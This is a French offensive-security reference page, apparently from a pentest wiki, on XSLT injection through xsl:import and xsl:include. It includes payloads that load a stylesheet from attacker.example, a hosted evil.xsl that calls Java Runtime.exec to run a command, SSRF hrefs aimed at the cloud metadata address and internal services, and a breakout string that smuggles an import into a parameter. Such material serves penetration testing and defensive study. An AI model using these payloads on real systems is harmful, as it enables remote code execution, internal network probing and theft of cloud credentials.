---
title: "Abus d'import de feuille de style : charger une feuille de style distante"
description: "xsl:import et xsl:include résolvent des URI href contrôlées par l'attaquant au moment de la compilation, intégrant une feuille de style distante qui fournit templates, appels d'extension et SSRF."
keywords:
  - xsl:import
  - xsl:include
  - feuille de style distante
  - injection XSLT
  - SSRF
---

# Abus d'import de feuille de style

`xsl:import` et `xsl:include` insèrent une autre feuille de style dans la courante, résolvant l'URI `href` lorsque la feuille de style est compilée, avant que le moindre nœud ne soit mis en correspondance. Lorsqu'un attaquant contrôle ce `href`, ou contrôle le texte de feuille de style où un tel élément peut être placé, le moteur récupère et compile une feuille de style depuis un emplacement du choix de l'attaquant. Une feuille de style distante est elle-même du code exécutable, donc ce seul élément délivre tout ce que le moteur supporte : de nouveaux templates, des appels `document()` et les charges utiles de fonctions d'extension et de scripts qui donnent l'exécution de code, le tout hébergé hors de la cible et remplaçable à volonté.

## Récupérer une feuille de style distante

Les deux éléments doivent apparaître comme enfants de premier niveau de `xsl:stylesheet`. Injectés là, ils chargent le fichier de l'attaquant :

```xml
<xsl:import href="http://attacker.example/evil.xsl"/>
<xsl:include href="http://attacker.example/evil.xsl"/>
```

`xsl:import` intègre les templates à une précédence inférieure, donc les définitions incluses viennent compléter plutôt qu'entrer en conflit ; `xsl:include` fusionne à précédence égale. Dans les deux cas le fichier distant s'exécute. Le `evil.xsl` hébergé porte la vraie charge utile, par exemple une liaison Java `Runtime.exec` ou un bloc `msxsl:script`, maintenant la requête injectée minimale pendant que le code dangereux reste sur le serveur de l'attaquant :

```xml
<!-- evil.xsl served from attacker.example -->
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:value-of select="rt:exec(rt:getRuntime(), 'id')"/>
  </xsl:template>
</xsl:stylesheet>
```

## SSRF et confirmation de récupération

Même quand la feuille de style récupérée est rejetée (mal formée, mauvaise version, scripting désactivé), la récupération au moment de la compilation a déjà eu lieu, donc le `href` est une primitive SSRF à part entière. Le pointer vers un service interne ou un journal de l'attaquant confirme la portée sortante et identifie la gestion des URI du moteur :

```xml
<xsl:import href="http://169.254.169.254/latest/meta-data/"/>
<xsl:include href="http://internal.svc.local/health"/>
```

Un contact sur l'hôte de l'attaquant prouve que la récupération part et révèle le user agent et l'adresse source du moteur ; une erreur de parsing qui renvoie le corps récupéré fuite le contenu de la réponse interne via le message d'erreur.

## Vecteurs de livraison

L'injection atteint le premier niveau selon deux formes courantes. Là où l'application concatène un paramètre dans la feuille de style près de son en-tête, la valeur `"/><xsl:import href="http://attacker.example/evil.xsl"/><xsl:template match="x` ferme l'élément environnant et insère l'import. Là où l'application accepte d'emblée une feuille de style téléversée ou référencée, aucune rupture n'est nécessaire : l'import ou l'include fait simplement partie du document soumis. Le support de protocole varie selon le moteur, donc les URI `http`, `ftp` et `jar:` valent chacune la peine d'être sondées quand le résolveur `http` par défaut est restreint.

## Outils

- **Burp Collaborator** : confirmation de la récupération au moment de la compilation d'une feuille de style distante.
- **Burp Repeater** : injection de `xsl:import` et `xsl:include` avec des href hébergés par l'attaquant.
- Tests manuels avec un `evil.xsl` hébergé portant la charge utile.

## Références

- [W3C XSLT 2.0: Combining Stylesheets with xsl:include and xsl:import](https://www.w3.org/TR/xslt20/#include)
- [PayloadsAllTheThings: XSLT Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSLT%20Injection/README.md)
